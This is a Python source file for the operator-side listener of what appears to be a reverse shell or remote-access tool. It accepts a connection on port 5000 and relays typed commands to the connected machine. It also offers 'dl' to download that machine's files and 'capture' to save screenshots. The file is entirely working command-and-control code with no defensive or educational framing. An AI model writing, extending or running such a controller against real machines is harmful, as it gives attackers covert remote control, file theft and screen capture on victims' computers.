from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
import subprocess
import os


HOST_IP = "0.0.0.0"
HOST_PORT = 5000
MAX_DATA_SIZE = 1024

class TCPServer:
    def __init__(self):
        self.server_socket = socket(AF_INET, SOCK_STREAM)
    

    def start(self):
        self.server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.server_socket.bind((HOST_IP, HOST_PORT))
        self.server_socket.listen()
        print("Server listenning ...")
    

    def get_connection(self):
        client_socket, client_addr = self.server_socket.accept()
        return client_socket, client_addr

    def socket_receive_all_data(self, client_socket, data_len):
        current_data_len = 0
        total_data = None
        while current_data_len < data_len:
            chunk_len = data_len - current_data_len
            if chunk_len > MAX_DATA_SIZE:
                chunk_len = MAX_DATA_SIZE
            data = client_socket.recv(chunk_len)
            if not data:
                return None
            if not total_data:
                total_data = data
            else:
                total_data += data
            current_data_len += len(data)

        return total_data

    def socket_send_command_and_receive_all_data(self, client_socket, command):
        if not command:
            return None
        client_socket.sendall(command.encode())

        header_data = self.socket_receive_all_data(client_socket, 13)
        if not header_data:
             return None
        len_data = int(header_data.decode())

        data_received = self.socket_receive_all_data(client_socket, len_data)
        return data_received

    def run(self):
        self.start()
        client_socket, client_addr = self.get_connection()
        
        filename = None

        while True:
            infos_data = self.socket_send_command_and_receive_all_data(client_socket, "infos")
            if not infos_data:
                break

            commande = input(client_addr[0] + ":" + str(client_addr[1]) + " " + infos_data.decode() + " >")
            if commande == "exit":
                break
            
            commande_split = commande.split()
            if len(commande_split) == 2 and commande_split[0] == "dl":
                filename = commande_split[1]
            elif len(commande_split) == 2 and commande_split[0] == "capture":
                filename = commande_split[1] + ".png"
            
            data_received = self.socket_send_command_and_receive_all_data(client_socket, commande)
            if not data_received:
                break
            
            if filename:
                if len(data_received) == 1 and data_received == b" ":
                    print(f"ERROR : The file {filename} doesn't exist")
                else:
                    f = open(filename, "wb")
                    f.write(data_received)
                    f.close()
                    print(f"File {filename} downloaded")
                filename = None
            else:
                print(data_received.decode())
        client_socket.close()


server = TCPServer()
server.run()